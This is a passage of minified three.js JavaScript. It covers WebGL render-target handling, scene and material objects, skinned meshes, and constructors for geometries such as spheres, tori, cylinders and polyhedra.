b=a&&a.isWebGLRenderTargetCube,\nc;a?(c=ha.get(a),c=b?c.__webglFramebuffer[a.activeCubeFace]:c.__webglFramebuffer,X.copy(a.scissor),Sa=a.scissorTest,Z.copy(a.viewport)):(c=null,X.copy(ga).multiplyScalar(Ra),Sa=ka,Z.copy(ia).multiplyScalar(Ra));N!==c&&(B.bindFramebuffer(B.FRAMEBUFFER,c),N=c);Y.scissor(X);Y.setScissorTest(Sa);Y.viewport(Z);b&&(b=ha.get(a.texture),B.framebufferTexture2D(B.FRAMEBUFFER,B.COLOR_ATTACHMENT0,B.TEXTURE_CUBE_MAP_POSITIVE_X+a.activeCubeFace,b.__webglTexture,a.activeMipMapLevel))};this.readRenderTargetPixels=\nfunction(a,b,c,d,e,f){if(!1===(a&&a.isWebGLRenderTarget))console.error(\"THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not THREE.WebGLRenderTarget.\");else{var g=ha.get(a).__webglFramebuffer;if(g){var h=!1;g!==N&&(B.bindFramebuffer(B.FRAMEBUFFER,g),h=!0);try{var k=a.texture,m=k.format,n=k.type;1023!==m&&w(m)!==B.getParameter(B.IMPLEMENTATION_COLOR_READ_FORMAT)?console.error(\"THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not in RGBA or implementation defined format.\"):1009===\nn||w(n)===B.getParameter(B.IMPLEMENTATION_COLOR_READ_TYPE)||1015===n&&(ja.get(\"OES_texture_float\")||ja.get(\"WEBGL_color_buffer_float\"))||1016===n&&ja.get(\"EXT_color_buffer_half_float\")?B.checkFramebufferStatus(B.FRAMEBUFFER)===B.FRAMEBUFFER_COMPLETE?0<=b&&b<=a.width-d&&0<=c&&c<=a.height-e&&B.readPixels(b,c,d,e,w(m),w(n),f):console.error(\"THREE.WebGLRenderer.readRenderTargetPixels: readPixels from renderTarget failed. Framebuffer not complete.\"):console.error(\"THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not in UnsignedByteType or implementation defined type.\")}finally{h&&\nB.bindFramebuffer(B.FRAMEBUFFER,N)}}}}}function Kb(a,b){this.name=\"\";this.color=new J(a);this.density=void 0!==b?b:2.5E-4}function Lb(a,b,c){this.name=\"\";this.color=new J(a);this.near=void 0!==b?b:1;this.far=void 0!==c?c:1E3}function mb(){x.call(this);this.type=\"Scene\";this.overrideMaterial=this.fog=this.background=null;this.autoUpdate=!0}function Zd(a,b,c,d,e){x.call(this);this.lensFlares=[];this.positionScreen=new q;this.customUpdateCallback=void 0;void 0!==a&&this.add(a,b,c,d,e)}function nb(a){X.call(this);\nthis.type=\"SpriteMaterial\";this.color=new J(16777215);this.map=null;this.rotation=0;this.lights=this.fog=!1;this.setValues(a)}function Dc(a){x.call(this);this.type=\"Sprite\";this.material=void 0!==a?a:new nb}function Ec(){x.call(this);this.type=\"LOD\";Object.defineProperties(this,{levels:{enumerable:!0,value:[]}})}function od(a,b,c){this.useVertexTexture=void 0!==c?c:!0;this.identityMatrix=new S;a=a||[];this.bones=a.slice(0);this.useVertexTexture?(a=Math.sqrt(4*this.bones.length),a=N.nextPowerOfTwo(Math.ceil(a)),\nthis.boneTextureHeight=this.boneTextureWidth=a=Math.max(a,4),this.boneMatrices=new Float32Array(this.boneTextureWidth*this.boneTextureHeight*4),this.boneTexture=new eb(this.boneMatrices,this.boneTextureWidth,this.boneTextureHeight,1023,1015)):this.boneMatrices=new Float32Array(16*this.bones.length);if(void 0===b)this.calculateInverses();else if(this.bones.length===b.length)this.boneInverses=b.slice(0);else for(console.warn(\"THREE.Skeleton bonInverses is the wrong length.\"),this.boneInverses=[],b=\n0,a=this.bones.length;b<a;b++)this.boneInverses.push(new S)}function pd(){x.call(this);this.type=\"Bone\"}function qd(a,b,c){Aa.call(this,a,b);this.type=\"SkinnedMesh\";this.bindMode=\"attached\";this.bindMatrix=new S;this.bindMatrixInverse=new S;a=[];if(this.geometry&&void 0!==this.geometry.bones){for(var d,e=0,f=this.geometry.bones.length;e<f;++e)d=this.geometry.bones[e],b=new pd,a.push(b),b.name=d.name,b.position.fromArray(d.pos),b.quaternion.fromArray(d.rotq),void 0!==d.scl&&b.scale.fromArray(d.scl);\ne=0;for(f=this.geometry.bones.length;e<f;++e)d=this.geometry.bones[e],-1!==d.parent&&null!==d.parent&&void 0!==a[d.parent]?a[d.parent].add(a[e]):this.add(a[e])}this.normalizeSkinWeights();this.updateMatrixWorld(!0);this.bind(new od(a,void 0,c),this.matrixWorld)}function ia(a){X.call(this);this.type=\"LineBasicMaterial\";this.color=new J(16777215);this.linewidth=1;this.linejoin=this.linecap=\"round\";this.lights=!1;this.setValues(a)}function Ua(a,b,c){if(1===c)return console.warn(\"THREE.Line: parameter THREE.LinePieces no longer supported. Created THREE.LineSegments instead.\"),\nnew ga(a,b);x.call(this);this.type=\"Line\";this.geometry=void 0!==a?a:new I;this.material=void 0!==b?b:new ia({color:16777215*Math.random()})}function ga(a,b){Ua.call(this,a,b);this.type=\"LineSegments\"}function Oa(a){X.call(this);this.type=\"PointsMaterial\";this.color=new J(16777215);this.map=null;this.size=1;this.sizeAttenuation=!0;this.lights=!1;this.setValues(a)}function Mb(a,b){x.call(this);this.type=\"Points\";this.geometry=void 0!==a?a:new I;this.material=void 0!==b?b:new Oa({color:16777215*Math.random()})}\nfunction Fc(){x.call(this);this.type=\"Group\"}function rd(a,b,c,d,e,f,g,h,m){function k(){requestAnimationFrame(k);a.readyState>=a.HAVE_CURRENT_DATA&&(t.needsUpdate=!0)}ea.call(this,a,b,c,d,e,f,g,h,m);this.generateMipmaps=!1;var t=this;k()}function Nb(a,b,c,d,e,f,g,h,m,k,t,p){ea.call(this,null,f,g,h,m,k,d,e,t,p);this.image={width:b,height:c};this.mipmaps=a;this.generateMipmaps=this.flipY=!1}function sd(a,b,c,d,e,f,g,h,m){ea.call(this,a,b,c,d,e,f,g,h,m);this.needsUpdate=!0}function Gc(a,b,c,d,e,f,g,\nh,m,k){k=void 0!==k?k:1026;if(1026!==k&&1027!==k)throw Error(\"DepthTexture format must be either THREE.DepthFormat or THREE.DepthStencilFormat\");void 0===c&&1026===k&&(c=1012);void 0===c&&1027===k&&(c=1020);ea.call(this,null,d,e,f,g,h,k,c,m);this.image={width:a,height:b};this.magFilter=void 0!==g?g:1003;this.minFilter=void 0!==h?h:1003;this.generateMipmaps=this.flipY=!1}function Ob(a){function b(a,b){return a-b}I.call(this);this.type=\"WireframeGeometry\";var c=[],d,e,f,g,h=[0,0],m={},k,t=[\"a\",\"b\",\n\"c\"];if(a&&a.isGeometry){var p=a.faces;d=0;for(f=p.length;d<f;d++){var n=p[d];for(e=0;3>e;e++)h[0]=n[t[e]],h[1]=n[t[(e+1)%3]],h.sort(b),k=h.toString(),void 0===m[k]&&(m[k]={index1:h[0],index2:h[1]})}for(k in m)d=m[k],t=a.vertices[d.index1],c.push(t.x,t.y,t.z),t=a.vertices[d.index2],c.push(t.x,t.y,t.z)}else if(a&&a.isBufferGeometry){var l,t=new q;if(null!==a.index){p=a.attributes.position;n=a.index;l=a.groups;0===l.length&&a.addGroup(0,n.count);a=0;for(g=l.length;a<g;++a)for(d=l[a],e=d.start,f=d.count,\nd=e,f=e+f;d<f;d+=3)for(e=0;3>e;e++)h[0]=n.getX(d+e),h[1]=n.getX(d+(e+1)%3),h.sort(b),k=h.toString(),void 0===m[k]&&(m[k]={index1:h[0],index2:h[1]});for(k in m)d=m[k],t.fromBufferAttribute(p,d.index1),c.push(t.x,t.y,t.z),t.fromBufferAttribute(p,d.index2),c.push(t.x,t.y,t.z)}else for(p=a.attributes.position,d=0,f=p.count/3;d<f;d++)for(e=0;3>e;e++)m=3*d+e,t.fromBufferAttribute(p,m),c.push(t.x,t.y,t.z),m=3*d+(e+1)%3,t.fromBufferAttribute(p,m),c.push(t.x,t.y,t.z)}this.addAttribute(\"position\",new z(c,3))}\nfunction Hc(a,b,c){T.call(this);this.type=\"ParametricGeometry\";this.parameters={func:a,slices:b,stacks:c};this.fromBufferGeometry(new Pb(a,b,c));this.mergeVertices()}function Pb(a,b,c){I.call(this);this.type=\"ParametricBufferGeometry\";this.parameters={func:a,slices:b,stacks:c};var d=[],e=[],f=[],g,h,m=b+1;for(g=0;g<=c;g++){var k=g/c;for(h=0;h<=b;h++){var t=h/b,p=a(t,k);e.push(p.x,p.y,p.z);f.push(t,k)}}for(g=0;g<c;g++)for(h=0;h<b;h++)a=g*m+h+1,k=(g+1)*m+h+1,t=(g+1)*m+h,d.push(g*m+h,a,t),d.push(a,k,\nt);this.setIndex(d);this.addAttribute(\"position\",new z(e,3));this.addAttribute(\"uv\",new z(f,2));this.computeVertexNormals()}function Ic(a,b,c,d){T.call(this);this.type=\"PolyhedronGeometry\";this.parameters={vertices:a,indices:b,radius:c,detail:d};this.fromBufferGeometry(new Ba(a,b,c,d));this.mergeVertices()}function Ba(a,b,c,d){function e(a){h.push(a.x,a.y,a.z)}function f(b,c){var d=3*b;c.x=a[d+0];c.y=a[d+1];c.z=a[d+2]}function g(a,b,c,d){0>d&&1===a.x&&(m[b]=a.x-1);0===c.x&&0===c.z&&(m[b]=d/2/Math.PI+\n.5)}I.call(this);this.type=\"PolyhedronBufferGeometry\";this.parameters={vertices:a,indices:b,radius:c,detail:d};c=c||1;var h=[],m=[];(function(a){for(var c=new q,d=new q,g=new q,h=0;h<b.length;h+=3){f(b[h+0],c);f(b[h+1],d);f(b[h+2],g);var m=c,l=d,A=g,w=Math.pow(2,a),y=[],K,v;for(K=0;K<=w;K++){y[K]=[];var E=m.clone().lerp(A,K/w),L=l.clone().lerp(A,K/w),C=w-K;for(v=0;v<=C;v++)y[K][v]=0===v&&K===w?E:E.clone().lerp(L,v/C)}for(K=0;K<w;K++)for(v=0;v<2*(w-K)-1;v++)m=Math.floor(v/2),0===v%2?(e(y[K][m+1]),\ne(y[K+1][m]),e(y[K][m])):(e(y[K][m+1]),e(y[K+1][m+1]),e(y[K+1][m]))}})(d||0);(function(a){for(var b=new q,c=0;c<h.length;c+=3)b.x=h[c+0],b.y=h[c+1],b.z=h[c+2],b.normalize().multiplyScalar(a),h[c+0]=b.x,h[c+1]=b.y,h[c+2]=b.z})(c);(function(){for(var a=new q,b=0;b<h.length;b+=3)a.x=h[b+0],a.y=h[b+1],a.z=h[b+2],m.push(Math.atan2(a.z,-a.x)/2/Math.PI+.5,1-(Math.atan2(-a.y,Math.sqrt(a.x*a.x+a.z*a.z))/Math.PI+.5));for(var a=new q,b=new q,c=new q,d=new q,e=new D,f=new D,l=new D,A=0,w=0;A<h.length;A+=9,w+=\n6){a.set(h[A+0],h[A+1],h[A+2]);b.set(h[A+3],h[A+4],h[A+5]);c.set(h[A+6],h[A+7],h[A+8]);e.set(m[w+0],m[w+1]);f.set(m[w+2],m[w+3]);l.set(m[w+4],m[w+5]);d.copy(a).add(b).add(c).divideScalar(3);var y=Math.atan2(d.z,-d.x);g(e,w+0,a,y);g(f,w+2,b,y);g(l,w+4,c,y)}for(a=0;a<m.length;a+=6)b=m[a+0],c=m[a+2],d=m[a+4],e=Math.min(b,c,d),.9<Math.max(b,c,d)&&.1>e&&(.2>b&&(m[a+0]+=1),.2>c&&(m[a+2]+=1),.2>d&&(m[a+4]+=1))})();this.addAttribute(\"position\",new z(h,3));this.addAttribute(\"normal\",new z(h.slice(),3));this.addAttribute(\"uv\",\nnew z(m,2));this.normalizeNormals()}function Jc(a,b){T.call(this);this.type=\"TetrahedronGeometry\";this.parameters={radius:a,detail:b};this.fromBufferGeometry(new Qb(a,b));this.mergeVertices()}function Qb(a,b){Ba.call(this,[1,1,1,-1,-1,1,-1,1,-1,1,-1,-1],[2,1,0,0,3,2,1,3,0,2,3,1],a,b);this.type=\"TetrahedronBufferGeometry\";this.parameters={radius:a,detail:b}}function Kc(a,b){T.call(this);this.type=\"OctahedronGeometry\";this.parameters={radius:a,detail:b};this.fromBufferGeometry(new ob(a,b));this.mergeVertices()}\nfunction ob(a,b){Ba.call(this,[1,0,0,-1,0,0,0,1,0,0,-1,0,0,0,1,0,0,-1],[0,2,4,0,4,3,0,3,5,0,5,2,1,2,5,1,5,3,1,3,4,1,4,2],a,b);this.type=\"OctahedronBufferGeometry\";this.parameters={radius:a,detail:b}}function Lc(a,b){T.call(this);this.type=\"IcosahedronGeometry\";this.parameters={radius:a,detail:b};this.fromBufferGeometry(new Rb(a,b));this.mergeVertices()}function Rb(a,b){var c=(1+Math.sqrt(5))/2;Ba.call(this,[-1,c,0,1,c,0,-1,-c,0,1,-c,0,0,-1,c,0,1,c,0,-1,-c,0,1,-c,c,0,-1,c,0,1,-c,0,-1,-c,0,1],[0,11,\n5,0,5,1,0,1,7,0,7,10,0,10,11,1,5,9,5,11,4,11,10,2,10,7,6,7,1,8,3,9,4,3,4,2,3,2,6,3,6,8,3,8,9,4,9,5,2,4,11,6,2,10,8,6,7,9,8,1],a,b);this.type=\"IcosahedronBufferGeometry\";this.parameters={radius:a,detail:b}}function Mc(a,b){T.call(this);this.type=\"DodecahedronGeometry\";this.parameters={radius:a,detail:b};this.fromBufferGeometry(new Sb(a,b));this.mergeVertices()}function Sb(a,b){var c=(1+Math.sqrt(5))/2,d=1/c;Ba.call(this,[-1,-1,-1,-1,-1,1,-1,1,-1,-1,1,1,1,-1,-1,1,-1,1,1,1,-1,1,1,1,0,-d,-c,0,-d,c,0,\nd,-c,0,d,c,-d,-c,0,-d,c,0,d,-c,0,d,c,0,-c,0,-d,c,0,-d,-c,0,d,c,0,d],[3,11,7,3,7,15,3,15,13,7,19,17,7,17,6,7,6,15,17,4,8,17,8,10,17,10,6,8,0,16,8,16,2,8,2,10,0,12,1,0,1,18,0,18,16,6,10,2,6,2,13,6,13,15,2,16,18,2,18,3,2,3,13,18,1,9,18,9,11,18,11,3,4,14,12,4,12,0,4,0,8,11,9,5,11,5,19,11,19,7,19,5,14,19,14,4,19,4,17,1,12,14,1,14,5,1,5,9],a,b);this.type=\"DodecahedronBufferGeometry\";this.parameters={radius:a,detail:b}}function Nc(a,b,c,d,e,f){T.call(this);this.type=\"TubeGeometry\";this.parameters={path:a,\ntubularSegments:b,radius:c,radialSegments:d,closed:e};void 0!==f&&console.warn(\"THREE.TubeGeometry: taper has been removed.\");a=new Tb(a,b,c,d,e);this.tangents=a.tangents;this.normals=a.normals;this.binormals=a.binormals;this.fromBufferGeometry(a);this.mergeVertices()}function Tb(a,b,c,d,e){function f(e){var f=a.getPointAt(e/b),k=g.normals[e];e=g.binormals[e];for(p=0;p<=d;p++){var t=p/d*Math.PI*2,r=Math.sin(t),t=-Math.cos(t);m.x=t*k.x+r*e.x;m.y=t*k.y+r*e.y;m.z=t*k.z+r*e.z;m.normalize();l.push(m.x,\nm.y,m.z);h.x=f.x+c*m.x;h.y=f.y+c*m.y;h.z=f.z+c*m.z;n.push(h.x,h.y,h.z)}}I.call(this);this.type=\"TubeBufferGeometry\";this.parameters={path:a,tubularSegments:b,radius:c,radialSegments:d,closed:e};b=b||64;c=c||1;d=d||8;e=e||!1;var g=a.computeFrenetFrames(b,e);this.tangents=g.tangents;this.normals=g.normals;this.binormals=g.binormals;var h=new q,m=new q,k=new D,t,p,n=[],l=[],G=[],r=[];for(t=0;t<b;t++)f(t);f(!1===e?b:0);for(t=0;t<=b;t++)for(p=0;p<=d;p++)k.x=t/b,k.y=p/d,G.push(k.x,k.y);(function(){for(p=\n1;p<=b;p++)for(t=1;t<=d;t++){var a=(d+1)*p+(t-1),c=(d+1)*p+t,e=(d+1)*(p-1)+t;r.push((d+1)*(p-1)+(t-1),a,e);r.push(a,c,e)}})();this.setIndex(r);this.addAttribute(\"position\",new z(n,3));this.addAttribute(\"normal\",new z(l,3));this.addAttribute(\"uv\",new z(G,2))}function Oc(a,b,c,d,e,f,g){T.call(this);this.type=\"TorusKnotGeometry\";this.parameters={radius:a,tube:b,tubularSegments:c,radialSegments:d,p:e,q:f};void 0!==g&&console.warn(\"THREE.TorusKnotGeometry: heightScale has been deprecated. Use .scale( x, y, z ) instead.\");\nthis.fromBufferGeometry(new Ub(a,b,c,d,e,f));this.mergeVertices()}function Ub(a,b,c,d,e,f){function g(a,b,c,d,e){var f=Math.sin(a);b=c/b*a;c=Math.cos(b);e.x=d*(2+c)*.5*Math.cos(a);e.y=d*(2+c)*f*.5;e.z=d*Math.sin(b)*.5}I.call(this);this.type=\"TorusKnotBufferGeometry\";this.parameters={radius:a,tube:b,tubularSegments:c,radialSegments:d,p:e,q:f};a=a||100;b=b||40;c=Math.floor(c)||64;d=Math.floor(d)||8;e=e||2;f=f||3;var h=[],m=[],k=[],t=[],p,n,l=new q,G=new q;new D;var r=new q,A=new q,w=new q,y=new q,K=\nnew q;for(p=0;p<=c;++p)for(n=p/c*e*Math.PI*2,g(n,e,f,a,r),g(n+.01,e,f,a,A),y.subVectors(A,r),K.addVectors(A,r),w.crossVectors(y,K),K.crossVectors(w,y),w.normalize(),K.normalize(),n=0;n<=d;++n){var v=n/d*Math.PI*2,E=-b*Math.cos(v),v=b*Math.sin(v);l.x=r.x+(E*K.x+v*w.x);l.y=r.y+(E*K.y+v*w.y);l.z=r.z+(E*K.z+v*w.z);m.push(l.x,l.y,l.z);G.subVectors(l,r).normalize();k.push(G.x,G.y,G.z);t.push(p/c);t.push(n/d)}for(n=1;n<=c;n++)for(p=1;p<=d;p++)a=(d+1)*n+(p-1),b=(d+1)*n+p,e=(d+1)*(n-1)+p,h.push((d+1)*(n-1)+\n(p-1),a,e),h.push(a,b,e);this.setIndex(h);this.addAttribute(\"position\",new z(m,3));this.addAttribute(\"normal\",new z(k,3));this.addAttribute(\"uv\",new z(t,2))}function Pc(a,b,c,d,e){T.call(this);this.type=\"TorusGeometry\";this.parameters={radius:a,tube:b,radialSegments:c,tubularSegments:d,arc:e};this.fromBufferGeometry(new Vb(a,b,c,d,e))}function Vb(a,b,c,d,e){I.call(this);this.type=\"TorusBufferGeometry\";this.parameters={radius:a,tube:b,radialSegments:c,tubularSegments:d,arc:e};a=a||100;b=b||40;c=Math.floor(c)||\n8;d=Math.floor(d)||6;e=e||2*Math.PI;var f=[],g=[],h=[],m=[],k=new q,t=new q,p=new q,n,l;for(n=0;n<=c;n++)for(l=0;l<=d;l++){var G=l/d*e,r=n/c*Math.PI*2;t.x=(a+b*Math.cos(r))*Math.cos(G);t.y=(a+b*Math.cos(r))*Math.sin(G);t.z=b*Math.sin(r);g.push(t.x,t.y,t.z);k.x=a*Math.cos(G);k.y=a*Math.sin(G);p.subVectors(t,k).normalize();h.push(p.x,p.y,p.z);m.push(l/d);m.push(n/c)}for(n=1;n<=c;n++)for(l=1;l<=d;l++)a=(d+1)*(n-1)+l-1,b=(d+1)*(n-1)+l,e=(d+1)*n+l,f.push((d+1)*n+l-1,a,e),f.push(a,b,e);this.setIndex(f);\nthis.addAttribute(\"position\",new z(g,3));this.addAttribute(\"normal\",new z(h,3));this.addAttribute(\"uv\",new z(m,2))}function La(a,b){\"undefined\"!==typeof a&&(T.call(this),this.type=\"ExtrudeGeometry\",a=Array.isArray(a)?a:[a],this.addShapeList(a,b),this.computeFaceNormals())}function Qc(a,b){b=b||{};var c=b.font;if(!1===(c&&c.isFont))return console.error(\"THREE.TextGeometry: font parameter is not an instance of THREE.Font.\"),new T;c=c.generateShapes(a,b.size,b.curveSegments);b.amount=void 0!==b.height?\nb.height:50;void 0===b.bevelThickness&&(b.bevelThickness=10);void 0===b.bevelSize&&(b.bevelSize=8);void 0===b.bevelEnabled&&(b.bevelEnabled=!1);La.call(this,c,b);this.type=\"TextGeometry\"}function Rc(a,b,c,d,e,f,g){T.call(this);this.type=\"SphereGeometry\";this.parameters={radius:a,widthSegments:b,heightSegments:c,phiStart:d,phiLength:e,thetaStart:f,thetaLength:g};this.fromBufferGeometry(new pb(a,b,c,d,e,f,g))}function pb(a,b,c,d,e,f,g){I.call(this);this.type=\"SphereBufferGeometry\";this.parameters={radius:a,\nwidthSegments:b,heightSegments:c,phiStart:d,phiLength:e,thetaStart:f,thetaLength:g};a=a||50;b=Math.max(3,Math.floor(b)||8);c=Math.max(2,Math.floor(c)||6);d=void 0!==d?d:0;e=void 0!==e?e:2*Math.PI;f=void 0!==f?f:0;g=void 0!==g?g:Math.PI;var h=f+g,m,k,t=0,p=[],n=new q,l=new q,G=[],r=[],A=[],w=[];for(k=0;k<=c;k++){var y=[],K=k/c;for(m=0;m<=b;m++){var v=m/b;n.x=-a*Math.cos(d+v*e)*Math.sin(f+K*g);n.y=a*Math.cos(f+K*g);n.z=a*Math.sin(d+v*e)*Math.sin(f+K*g);r.push(n.x,n.y,n.z);l.set(n.x,n.y,n.z).normalize();\nA.push(l.x,l.y,l.z);w.push(v,1-K);y.push(t++)}p.push(y)}for(k=0;k<c;k++)for(m=0;m<b;m++)a=p[k][m+1],d=p[k][m],e=p[k+1][m],g=p[k+1][m+1],(0!==k||0<f)&&G.push(a,d,g),(k!==c-1||h<Math.PI)&&G.push(d,e,g);this.setIndex(G);this.addAttribute(\"position\",new z(r,3));this.addAttribute(\"normal\",new z(A,3));this.addAttribute(\"uv\",new z(w,2))}function Sc(a,b,c,d,e,f){T.call(this);this.type=\"RingGeometry\";this.parameters={innerRadius:a,outerRadius:b,thetaSegments:c,phiSegments:d,thetaStart:e,thetaLength:f};this.fromBufferGeometry(new Wb(a,\nb,c,d,e,f))}function Wb(a,b,c,d,e,f){I.call(this);this.type=\"RingBufferGeometry\";this.parameters={innerRadius:a,outerRadius:b,thetaSegments:c,phiSegments:d,thetaStart:e,thetaLength:f};a=a||20;b=b||50;e=void 0!==e?e:0;f=void 0!==f?f:2*Math.PI;c=void 0!==c?Math.max(3,c):8;d=void 0!==d?Math.max(1,d):1;var g=[],h=[],m=[],k=[],t=a,p=(b-a)/d,n=new q,l=new D,G,r;for(G=0;G<=d;G++){for(r=0;r<=c;r++)a=e+r/c*f,n.x=t*Math.cos(a),n.y=t*Math.sin(a),h.push(n.x,n.y,n.z),m.push(0,0,1),l.x=(n.x/b+1)/2,l.y=(n.y/b+1)/\n2,k.push(l.x,l.y);t+=p}for(G=0;G<d;G++)for(b=G*(c+1),r=0;r<c;r++)a=r+b,e=a+c+1,f=a+c+2,t=a+1,g.push(a,e,t),g.push(e,f,t);this.setIndex(g);this.addAttribute(\"position\",new z(h,3));this.addAttribute(\"normal\",new z(m,3));this.addAttribute(\"uv\",new z(k,2))}function Tc(a,b,c,d){T.call(this);this.type=\"LatheGeometry\";this.parameters={points:a,segments:b,phiStart:c,phiLength:d};this.fromBufferGeometry(new Xb(a,b,c,d));this.mergeVertices()}function Xb(a,b,c,d){I.call(this);this.type=\"LatheBufferGeometry\";\nthis.parameters={points:a,segments:b,phiStart:c,phiLength:d};b=Math.floor(b)||12;c=c||0;d=d||2*Math.PI;d=N.clamp(d,0,2*Math.PI);var e=[],f=[],g=[],h=1/b,m=new q,k=new D,t,p;for(t=0;t<=b;t++){p=c+t*h*d;var n=Math.sin(p),l=Math.cos(p);for(p=0;p<=a.length-1;p++)m.x=a[p].x*n,m.y=a[p].y,m.z=a[p].x*l,f.push(m.x,m.y,m.z),k.x=t/b,k.y=p/(a.length-1),g.push(k.x,k.y)}for(t=0;t<b;t++)for(p=0;p<a.length-1;p++)c=p+t*a.length,h=c+a.length,m=c+a.length+1,k=c+1,e.push(c,h,k),e.push(h,m,k);this.setIndex(e);this.addAttribute(\"position\",\nnew z(f,3));this.addAttribute(\"uv\",new z(g,2));this.computeVertexNormals();if(d===2*Math.PI)for(d=this.attributes.normal.array,e=new q,f=new q,g=new q,c=b*a.length*3,p=t=0;t<a.length;t++,p+=3)e.x=d[p+0],e.y=d[p+1],e.z=d[p+2],f.x=d[c+p+0],f.y=d[c+p+1],f.z=d[c+p+2],g.addVectors(e,f).normalize(),d[p+0]=d[c+p+0]=g.x,d[p+1]=d[c+p+1]=g.y,d[p+2]=d[c+p+2]=g.z}function Yb(a,b){T.call(this);this.type=\"ShapeGeometry\";\"object\"===typeof b&&(console.warn(\"THREE.ShapeGeometry: Options parameter has been removed.\"),\nb=b.curveSegments);this.parameters={shapes:a,curveSegments:b};this.fromBufferGeometry(new Zb(a,b));this.mergeVertices()}function Zb(a,b){function c(a){var c,h,k=e.length/3;a=a.extractPoints(b);var l=a.shape,r=a.holes;if(!1===Ia.isClockWise(l))for(l=l.reverse(),a=0,c=r.length;a<c;a++)h=r[a],!0===Ia.isClockWise(h)&&(r[a]=h.reverse());var q=Ia.triangulateShape(l,r);a=0;for(c=r.length;a<c;a++)h=r[a],l=l.concat(h);a=0;for(c=l.length;a<c;a++)h=l[a],e.push(h.x,h.y,0),f.push(0,0,1),g.push(h.x,h.y);a=0;for(c=\nq.length;a<c;a++)l=q[a],d.push(l[0]+k,l[1]+k,l[2]+k),m+=3}I.call(this);this.type=\"ShapeBufferGeometry\";this.parameters={shapes:a,curveSegments:b};b=b||12;var d=[],e=[],f=[],g=[],h=0,m=0;if(!1===Array.isArray(a))c(a);else for(var k=0;k<a.length;k++)c(a[k]),this.addGroup(h,m,k),h+=m,m=0;this.setIndex(d);this.addAttribute(\"position\",new z(e,3));this.addAttribute(\"normal\",new z(f,3));this.addAttribute(\"uv\",new z(g,2))}function $b(a,b){function c(a,b){return a-b}I.call(this);this.type=\"EdgesGeometry\";\nthis.parameters={thresholdAngle:b};var d=[],e=Math.cos(N.DEG2RAD*(void 0!==b?b:1)),f=[0,0],g={},h,m=[\"a\",\"b\",\"c\"],k;a.isBufferGeometry?(k=new T,k.fromBufferGeometry(a)):k=a.clone();k.mergeVertices();k.computeFaceNormals();var t=k.vertices;k=k.faces;for(var p=0,n=k.length;p<n;p++)for(var l=k[p],q=0;3>q;q++)f[0]=l[m[q]],f[1]=l[m[(q+1)%3]],f.sort(c),h=f.toString(),void 0===g[h]?g[h]={index1:f[0],index2:f[1],face1:p,face2:void 0}:g[h].face2=p;for(h in g)if(f=g[h],void 0===f.face2||k[f.face1].normal.dot(k[f.face2].normal)<=\ne)m=t[f.index1],d.push(m.x,m.y,m.z),m=t[f.index2],d.push(m.x,m.y,m.z);this.addAttribute(\"position\",new z(d,3))}function qb(a,b,c,d,e,f,g,h){T.call(this);this.type=\"CylinderGeometry\";this.parameters={radiusTop:a,radiusBottom:b,height:c,radialSegments:d,heightSegments:e,openEnded:f,thetaStart:g,thetaLength:h};this.fromBufferGeometry(new Va(a,b,c,d,e,f,g,h));this.mergeVertices()}function Va(a,b,c,d,e,f,g,h){function m(c){var e,f,m,r=new D,C=new q,F=0,x=!0===c?a:b,H=!0===c?1:-1;f=G;for(e=1;e<=d;e++)p.push(0,\nA*H,0),n.push(0,H,0),l.push(.5,.5),G++;m=G;for(e=0;e<=d;e++){var aa=e/d*h+g,z=Math.cos(aa),aa=Math.sin(aa);C.x=x*aa;C.y=A*H;C.z=x*z;p.push(C.x,C.y,C.z);n.push(0,H,0);r.x=.5*z+.5;r.y=.5*aa*H+.5;l.push(r.x,r.y);G++}for(e=0;e<d;e++)r=f+e,C=m+e,!0===c?t.push(C,C+1,r):t.push(C+1,C,r),F+=3;k.addGroup(w,F,!0===c?1:2);w+=F}I.call(this);this.type=\"CylinderBufferGeometry\";this.parameters={radiusTop:a,radiusBottom:b,height:c,radialSegments:d,heightSegments:e,openEnded:f,thetaStart:g,thetaLength:h};var k=this;\na=void 0!==a?a:20;b=void 0!==b?b:20;c=void 0!==c?c:100;d=Math.floor(d)||8;e=Math.floor(e)||1;f=void 0!==f?f:!1;g=void 0!==g?g:0;h=void 0!==h?h:2*Math.PI;var t=[],p=[],n=[],l=[],G=0,r=[],A=c/2,w=0;(function(){var f,m,v=new q,E=new q,L=0,C=(b-a)/c;for(m=0;m<=e;m++){var F=[],x=m/e,H=x*(b-a)+a;for(f=0;f<=d;f++){var D=f/d,z=D*h+g,J=Math.sin(z),z=Math.cos(z);E.x=H*J;E.y=-x*c+A;E.z=H*z;p.push(E.x,E.y,E.z);v.set(J,C,z).normalize();n.push(v.x,v.y,v.z);l.push(D,1-x);F.push(G++)}r.push(F)}for(f=0;f<d;f++)for(m=\n0;m<e;m++)v=r[m+1][f],E=r[m+1][f+1],C=r[m][f+1],t.push(r[m][f],v,C),t.push(v,E,C),L+=6;k.addGroup(w,L,0);w+=L})();!1===f&&(0<a&&m(!0),0<b&&m(!1));this.setIndex(t);this.addAttribute(\"position\",new z(p,3));this.addAttribute(\"normal\",new z(n,3));this.addAttribute(\"uv\",new z(l,2))}function Uc(a,b,c,d,e,f,g){qb.call(this,0,a,b,c,d,e,f,g);this.type=\"ConeGeometry\";this.parameters={radius:a,height:b,radialSegments:c,heightSegments:d,openEnded:e,thetaStart:f,thetaLength:g}}function Vc(a,b,c,d,e,f,g){Va.call(this,\n0,a,b,c,d,e,f,g);this.type=\"ConeBufferGeometry\";this.parameters={radius:a,height:b,radialSegments:c,heightSegments:d,openEnded:e,thetaStart:f,thetaLength:g}}function Wc(a,b,c,d){T.call(this);this.type=\"CircleGeometry\";this.parameters={radius:a,segments:b,thetaStart:c,thetaLength:d};this.fromBufferGeometry(new ac(a,b,c,d))}function ac(a,b,c,d){I.call(this);this.type=\"CircleBufferGeometry\";this.parameters={radius:a,segments:b,thetaStart:c,thetaLength:d};a=a||50;b=void 0!==b?Math.max(3,b):8;c=void 0!==\nc?c:0;d=void 0!==d?d:2*Math.PI;var e=[],f=[],g=[],h=[],m,k,t=new q,p=new D;f.push(0,0,0);g.push(0,0,1);h.push(.5,.5);k=0;for(m=3;k<=b;k++,m+=3){var 